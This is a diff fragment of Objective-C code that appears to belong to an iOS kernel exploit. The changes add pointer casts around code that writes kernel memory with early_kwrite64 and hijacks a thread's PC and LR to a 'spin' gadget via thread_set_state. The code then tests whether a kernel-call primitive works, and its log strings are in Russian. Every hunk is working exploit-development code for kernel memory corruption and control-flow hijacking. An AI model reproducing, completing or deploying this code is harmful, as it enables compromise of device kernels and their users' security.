@@ -2427,8 +2427,8 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                         early_kwrite64(oVA, o0 | 0x8000ULL);
                                         arm_thread_state64_t st;
                                         memset(&st, 0, sizeof(st));
-                                        st.__opaque_pc = spin;
-                                        st.__opaque_lr = spin;
+                                        st.__opaque_pc = (void *)(uintptr_t)spin;
+                                        st.__opaque_lr = (void *)(uintptr_t)spin;
                                         thread_set_state(helper, ARM_THREAD_STATE64, (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
                                         thread_resume(helper);
                                         usleep(20000);
@@ -2437,7 +2437,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                         thread_suspend(helper);
                                         thread_get_state(helper, ARM_THREAD_STATE64, (thread_state_t)&out, &cnt);
                                         kpNote(r, [NSString stringWithFormat:@"  [KCALL3] helper pc=%#llx lr=%#llx → %@",
-                                                  (unsigned long long)out.__opaque_pc, (unsigned long long)out.__opaque_lr,
+                                                  (unsigned long long)(uintptr_t)out.__opaque_pc, (unsigned long long)(uintptr_t)out.__opaque_lr,
                                                   (out.__opaque_pc == spin) ? @"SPIN ★★ kcall живой" : @"не на гаджете"]);
                                         early_kwrite64(oVA, o0);
                                         thread_terminate(helper);
@@ -2466,10 +2466,9 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                 arm_thread_state64_t st;
                                 memset(&st, 0, sizeof(st));
                                 // raw PC = spin-gadget, LR = spin-gadget
-                                st.__opaque_pc = spin;
-                                st.__opaque_lr = spin;
-                                st.__sp = 0;
-                                thread_set_state(myTh, ARM_THREAD_STATE64, (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
+                                st.__opaque_pc = (void *)(uintptr_t)spin;
+                                st.__opaque_lr = (void *)(uintptr_t)spin;
+                                                                thread_set_state(myTh, ARM_THREAD_STATE64, (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
                                 thread_resume(myTh);
                                 usleep(20000);
                                 arm_thread_state64_t out;
@@ -2477,8 +2476,8 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                 thread_suspend(myTh);
                                 thread_get_state(myTh, ARM_THREAD_STATE64, (thread_state_t)&out, &cnt);
                                 kpNote(r, [NSString stringWithFormat:@"  [KCALL3] after setstate pc=%#llx lr=%#llx (sp=%#llx)",
-                                          (unsigned long long)out.__opaque_pc, (unsigned long long)out.__opaque_lr,
-                                          (unsigned long long)out.__opaque_sp]);
+                                          (unsigned long long)(uintptr_t)out.__opaque_pc, (unsigned long long)(uintptr_t)out.__opaque_lr,
+                                          (unsigned long long)(uintptr_t)out.__opaque_sp]);
                                 // restore: put PC back somewhere sane - spin then we'll let it run out via exception
                                 // actually restore options and let thread continue (it's our main thread!)
                                 // SAFER: we suspended our own thread - must resume with ORIGINAL state
